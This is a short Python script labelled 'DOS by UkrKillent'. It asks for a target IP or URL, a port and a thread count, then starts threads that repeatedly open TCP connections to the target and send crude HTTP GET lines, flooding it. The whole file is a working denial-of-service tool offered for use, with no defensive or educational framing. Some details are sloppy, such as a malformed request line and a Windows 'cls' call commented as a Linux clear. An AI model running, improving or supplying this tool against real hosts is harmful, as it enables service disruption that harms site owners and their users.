import socket
import threading
import os

print("DOS by UkrKillent")

os.system("cls") #linux clear

target = input("Enter IP/URL: ")
port = int(input("Enter Port: "))
threads = int(input("Enter threads couns: "))

print("[REG-MARKER] Start attack")
attack_tried = 0

def dos():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target,port))
            s.close()
        except:
            print("Error")

        global attack_tried
        attack_tried += 1

        if attack_tried%300 == 0:
            print(attack_tried)

for x in range(threads):
    thread = threading.Thread(target=dos)
    thread.start()